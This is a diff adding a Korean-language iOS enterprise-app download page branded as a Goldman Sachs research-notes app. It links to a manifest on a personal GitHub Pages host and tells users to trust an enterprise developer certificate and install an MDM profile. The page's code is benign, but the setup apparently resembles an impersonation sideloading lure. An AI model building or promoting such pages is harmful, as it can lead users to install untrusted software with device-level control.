@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Goldman Sachs GS Note - 앱 다운로드</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .app-icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px;
+            border-radius: 26.4px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            background: linear-gradient(135deg, #0066cc 0%, #004999 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            font-weight: bold;
+            color: white;
+        }
+        
+        h1 {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        
+        .version {
+            display: inline-block;
+            background: #f0f0f0;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        
+        .install-button {
+            display: inline-block;
+            background: linear-gradient(135deg, #0066cc 0%, #004999 100%);
+            color: white;
+            text-decoration: none;
+            padding: 16px 48px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 102, 204, 0.4);
+            border: none;
+            cursor: pointer;
+        }
+        
+        .install-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 102, 204, 0.6);
+        }
+        
+        .install-button:active {
+            transform: translateY(0);
+        }
+        
+        .instructions {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 1px solid #eee;
+        }
+        
+        .instructions h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .steps {
+            text-align: left;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        
+        .step {
+            margin-bottom: 15px;
+            color: #555;
+            line-height: 1.6;
+        }
+        
+        .step-number {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            background: #0066cc;
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 24px;
+            font-size: 14px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            color: #856404;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .warning-icon {
+            font-size: 20px;
+            margin-right: 8px;
+        }
+        
+        .info {
+            background: #d1ecf1;
+            border: 1px solid #0c5460;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            color: #0c5460;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            color: #999;
+            font-size: 14px;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .install-button {
+                padding: 14px 36px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="app-icon">GS</div>
+        
+        <h1>Goldman Sachs GS Note</h1>
+        <p class="subtitle">Goldman Sachs Research Notes App</p>
+        
+        <div class="version">버전 1.0.0</div>
+        
+        <a href="itms-services://?action=download-manifest&url=https://ohkst.github.io/enterpriseipa/manifest.plist" 
+           class="install-button"
+           onclick="handleInstallClick(event)">
+            📱 앱 다운로드
+        </a>
+        
+        <div class="instructions">
+            <h2>📋 설치 방법</h2>
+            <div class="steps">
+                <div class="step">
+                    <span class="step-number">1</span>
+                    위의 "앱 다운로드" 버튼을 클릭합니다.
+                </div>
+                <div class="step">
+                    <span class="step-number">2</span>
+                    "Goldman Sachs GS Note을(를) 설치하시겠습니까?" 팝업이 나타나면 <strong>"설치"</strong>를 누릅니다.
+                </div>
+                <div class="step">
+                    <span class="step-number">3</span>
+                    설치가 완료되면 <strong>설정 → 일반 → VPN 및 기기 관리</strong>로 이동합니다.
+                </div>
+                <div class="step">
+                    <span class="step-number">4</span>
+                    "엔터프라이즈 앱" 섹션에서 <strong>Goldman Sachs</strong>를 선택합니다.
+                </div>
+                <div class="step">
+                    <span class="step-number">5</span>
+                    <strong>"Goldman Sachs 신뢰"</strong>를 누르고 확인합니다.
+                </div>
+                <div class="step">
+                    <span class="step-number">6</span>
+                    홈 화면에서 Goldman Sachs GS Note 앱을 실행합니다.
+                </div>
+            </div>
+        </div>
+        
+        <div class="warning">
+            <span class="warning-icon">⚠️</span>
+            <strong>중요:</strong> 이 앱은 Enterprise 배포용입니다. 설치 전 반드시 관리자의 승인을 받으시기 바랍니다.
+        </div>
+        
+        <div class="info">
+            <span class="warning-icon">ℹ️</span>
+            <strong>시스템 요구사항:</strong><br>
+            • iOS 15.6 이상<br>
+            • 인터넷 연결 필요<br>
+            • MDM 프로필 설치 필요
+        </div>
+        
+        <div class="footer">
+            <p>&copy; 2025 Goldman Sachs. All rights reserved.</p>
+            <p style="margin-top: 10px; font-size: 12px;">
+                문의사항이 있으시면 IT 지원팀에 연락하시기 바랍니다.
+            </p>
+        </div>
+    </div>
+    
+    <script>
+        function handleInstallClick(event) {
+            console.log('📱 앱 다운로드 버튼 클릭됨');
+            
+            // iOS 기기가 아닌 경우 경고
+            if (!/(iPhone|iPad|iPod)/i.test(navigator.userAgent)) {
+                event.preventDefault();
+                alert('이 앱은 iOS 기기에서만 설치할 수 있습니다.');
+                return false;
+            }
+            
+            // 설치 안내 메시지
+            setTimeout(function() {
+                console.log('📱 다운로드 시작됨');
+                
+                // 다운로드 진행 상태 표시
+                var button = event.target;
+                var originalText = button.textContent;
+                button.textContent = '⏳ 다운로드 중...';
+                button.style.pointerEvents = 'none';
+                
+                // 5초 후 버튼 원상복구
+                setTimeout(function() {
+                    button.textContent = originalText;
+                    button.style.pointerEvents = 'auto';
+                }, 5000);
+            }, 100);
+        }
+        
+        // 페이지 로드 시 기기 확인
+        window.addEventListener('DOMContentLoaded', function() {
+            console.log('📱 페이지 로드됨');
+            console.log('📱 User Agent:', navigator.userAgent);
+            
+            // iOS 버전 확인
+            var match = navigator.userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/);
+            if (match) {
+                var version = parseInt(match[1]);
+                console.log('📱 iOS 버전:', version);
+                
+                if (version < 15) {
+                    var warning = document.createElement('div');
+                    warning.className = 'warning';
+                    warning.innerHTML = '<span class="warning-icon">⚠️</span> <strong>경고:</strong> iOS 버전이 낮습니다. iOS 15.6 이상에서 사용하시기 바랍니다.';
+                    document.querySelector('.container').appendChild(warning);
+                }
+            }
+        });
+        
+        // 앱 설치 상태 확인 (선택적)
+        function checkAppInstallStatus() {
+            // iOS에서는 앱 설치 여부를 직접 확인할 수 없음
+            // 사용자가 설정을 통해 확인해야 함
+            console.log('📱 앱 설치 상태는 설정에서 확인하세요');
+        }
+    </script>
+</body>
+</html>
+
